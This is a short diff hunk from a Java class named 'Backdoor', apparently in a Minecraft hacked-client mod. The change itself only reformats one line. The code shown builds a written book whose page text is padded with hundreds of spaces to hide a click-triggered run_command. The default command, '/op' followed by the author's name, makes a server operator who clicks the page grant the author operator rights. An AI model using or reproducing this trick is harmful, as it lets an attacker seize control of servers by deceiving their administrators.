@@ -47,7 +47,8 @@ public class Backdoor extends Item {
         if (cmdStr.equals("generateForMe")) {
             cmdStr = "/op " + author;
         }
-        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr), new NbtProperty("author", author), new NbtList("pages",
+        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr), new NbtProperty("author", author), new NbtList(
+                "pages",
                 new NbtProperty("{\"text\": \"" + contentStr + " ".repeat(553) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + cmdStr + "\"}}"),
                 new NbtProperty("{\"text\":\"\"}"),
                 new NbtProperty("{\"text\":\"\"}")
